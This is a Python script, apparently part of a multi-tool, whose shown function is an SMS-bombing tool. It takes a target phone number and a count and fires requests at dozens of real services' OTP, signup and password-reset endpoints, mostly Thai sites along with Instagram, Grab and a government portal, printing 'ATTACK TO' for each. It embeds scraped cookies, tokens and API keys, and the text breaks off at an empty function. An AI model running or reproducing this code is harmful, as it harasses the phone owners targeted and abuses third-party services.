import json
import os, sys
import colorama
from string import ascii_uppercase
from typing import AsyncIterable
from urllib.request import urlopen
import requests 
import threading
import subprocess
import discord.ext
import os, httpx, random as rdm
import random, threading, os, datetime, asyncio
from re import search
from os import system
from time import sleep
from threading import Thread
from requests import Session
from websocket import WebSocket
from colorama import Fore, Style
from json import loads, dumps, load
from multiprocessing.pool import ThreadPool
from multiprocessing import current_process
from requests import Session, models,post,get
from concurrent.futures import ThreadPoolExecutor
from discord.ext import (    
    commands,
)
t_or_f = [True, False]
def smsspamnew():    
    print(Fore.GREEN + """ 
                        ░█▀▀░█▄█░█▀▀
                        ░▀▀█░█░█░▀▀█
                        ░▀▀▀░▀░▀░▀▀▀""")    
    phone = input("[+] Enter Phone : ")    
    count = int(input("[+] Enter Count : "))    
    sleep(2)        
    header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}    
    useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"    
    def sk1():        
        response = requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})
        print(f'[+]ATTACK TO {phone}')     
    def sk3():        
        response = requests.post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk5():        
        response = requests.post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk7():        
        response = requests.post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def sk9():        
        response = requests.post('https://api.sacasino9x.com/api/RegisterService/RequestOTP', headers=header, json={"Phone":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def sk10():        
        response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def sk11():        
      response = requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})       
      print(f'[+]ATTACK TO {phone}')       
    def sk13():        
      response = requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})       
      print(f'[+]ATTACK TO {phone}')       
    def sk15():        
      response = requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})       
      print(f'[+]ATTACK TO {phone}')       
    def sk16():        
      response = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})       
      print(f'[+]ATTACK TO {phone}')       
    def sk17():        
        response = requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})       
        print(f'[+]ATTACK TO {phone}')       
    def sk21():        
        response = requests.post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})       
        print(f'[+]ATTACK TO {phone}')       
         
    def sk23():        
        response = requests.post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"0{phone}"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk24():        
        response = requests.post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"0{phone}"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk25():        
        response = requests.post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"0{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk26():        
        response = requests.post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"0{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk27():        
        response = requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")       
        print(f'[+]ATTACK TO {phone}')       
    def sk28():        
        response = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"0{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk29():        
        response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk30():        
        response = requests.post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk31():        
        response = requests.post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})       
        print(f'[+]ATTACK TO {phone}')       
    def sk32():        
        response = requests.post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"0{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})       
        print(f'[+]ATTACK TO {phone}')       
    def x1():        
        response = requests.post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers= header)       
        print(f'[+]ATTACK TO {phone}')       
    def x2():        
        response = requests.post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=header)       
        print(f'[+]ATTACK TO {phone}')       
    def x4():        
        s=Session()        
        response = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})       
        print(f'[+]ATTACK TO {phone}')       
    def x8(): #pizza        
        response = requests.post('https://api2.1112.com/api/v1/otp/create', data = {'phonenumber': phone, 'language': "th"})       
        print(f'[+]ATTACK TO {phone}')       
    def x9():        
        response = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})       
        print(f'[+]ATTACK TO {phone}')       
    def x10():        
        response = requests.post('https://rapidapi.com/blaazetech/api/spam-caller-check/',json={"phonenumber":phone,"language":"th"},headers=header)       
        print(f'[+]ATTACK TO {phone}')       
    def api1():        
        response = requests.post("https://m.thisshop.com/cos/send/code/notice", json={"sessionContext":{"channel":"h5","entityCode":0,"userReferenceNumber":"12w12y11r52gz259ue14rr7g7370239m","localDateTimeText":"20220115182850","riskMessage":"{}","serviceCode":"FLEX0001","superUserId":"sysadmin","tokenKey":"149d5c7bae10304c8aba0da2bbc59cb7","authorizationReason":"","transactionBranch":"TFT_ORG_0000","userId":"","locale":"th-TH"},"noticeType":1,"businessType":"RT0001","phoneNumber":f"66-{phone}"},headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})       
        print(f'[+]ATTACK TO {phone}')       
    def api2():        
        headers = {            "content-type": "application/x-www-form-urlencoded",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",            "cookie": "_gcl_au=1.1.1123274548.1637746846"            }        
        response = requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")       
        print(f'[+]ATTACK TO {phone}')         
    def api4():        
        response = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api5():        
        response = requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api6():        
        response = requests.post("http://b226.com/x/code", data={f"phone":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api7():        
        response = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")       
        print(f'[+]ATTACK TO {phone}')       
    def api8():        
        response = requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api9():        
        response = requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")       
        print(f'[+]ATTACK TO {phone}')       
    def api10():        
        response = requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api11():        
        response = requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"})       
        print(f'[+]ATTACK TO {phone}')       
    def api12():        
        response = requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone":"66"+phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api13():        
        response = requests.post("https://www.msport1688.com/auth/otp_sender", data={"phoneNumber":phone,"token":"HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"})    
        print(f'[+]ATTACK TO {phone}')       
    def api14():        
        response=requests.post('https://www.msport1688.com/auth/otp_sender', headers=header, data={"phone": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api15():        
        response = requests.post("http://b226.com/x/code", data={f"phone":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api16():        
        response = requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api18():        
        response = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})       
        print(f'[+]ATTACK TO {phone}')       
    def api19():        
        response = requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")       
        print(f'[+]ATTACK TO {phone}')       
    def api20():        
        response = requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api21():        
        response = requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api22():        
        response = requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={})       
        print(f'[+]ATTACK TO {phone}')       
    def api23():        
        response = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api24():        
        response = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})       
        print(f'[+]ATTACK TO {phone}')       
    def api25():        
        response = requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api26():        
        response = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"})       
        print(f'[+]ATTACK TO {phone}')       
    def api27():        
        response = requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)       
        print(f'[+]ATTACK TO {phone}')       
    def api28():        
        response = requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api29():        
        response = requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": phone},headers={})       
        print(f'[+]ATTACK TO {phone}')       
    def api30():        
        response = requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api31():        
        response = requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": phone,"password":"123456789Az"})       
        print(f'[+]ATTACK TO {phone}')       
    def api32():        
        response = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})        
        response = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})       
        print(f'[+]ATTACK TO {phone}')       
    def api33():        
        head = {            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",            "referer": "https://laopun.com/register",            "cookie": "PHPSESSID=q32n008kgetm0tilch7f5qv2qp;_ga=GA1.1.677079826.1639848607;_ga_70EKP2Z28V=GS1.1.1639848607.1.1.1639848745.0"            }        
        response = requests.get(f"https://laopun.com/send-sms?id={phone}&otp=5153",headers=head)       
        print(f'[+]ATTACK TO {phone}')       
    def api34():        
        response = requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api35():        
        head = {            "content-type": "application/json;charset=UTF-8",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "accept": "application/json, text/plain, */*",            "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",            "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"            }        
        response = requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0})       
        print(f'[+]ATTACK TO {phone}')       
    def api36():        
        head = {            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",            "content-type": "application/json; charset=utf-8",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "accept": "*/*",            "referer": "https://nocnoc.com/login",            "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"            }        
        response = requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"xe0xb8x9fxe0xb8x87xe0xb8x9fxe0xb8x87 xe0xb8x9fxe0xb8x87xe0xb8x9fxe0xb8xa7"}})       
        print(f'[+]ATTACK TO {phone}')       
    def api37():        
        response = requests.post("https://icq.com/smscode/login/en", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})       
        print(f'[+]ATTACK TO {phone}')       
    def api38():        
        response = requests.post("https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone,'language': "th"})       
        print(f'[+]ATTACK TO {phone}')       
    def api39():        
        response = requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": phone,"password":"","client":"ecommerce"},headers={})       
        print(f'[+]ATTACK TO {phone}')       
    def api40():        
        headers={            "organizationcode": "lifestyle",            "content-type": "application/json"            }        
        json = {"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone,"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {n  sendOTPRegister(input: $input) {n    tokenn    otpReferencen    expirationOnn    __typenamen  }n}n"}        
        response = requests.post("https://graph.firster.com/graphql",headers=headers,json=json)       
        print(f'[+]ATTACK TO {phone}')       
    def api41():        
        response = requests.post("https://m.riches666.com/api/register-otp", data={"brands_id":"60a6563a232a600012521982","agent_register":"60a76a7f233d2900110070e0","tel":phone})       
        print(f'[+]ATTACK TO {phone}')       
    def api42():        
        head = {            "x-requested-with": "XMLHttpRequest",            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",            "accept": "*/*",            "referer": "https://www.pruksa.com/member/register/otp_code",            "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"            }        
        response = requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")       
        print(f'[+]ATTACK TO {phone}')       
    def api43():        
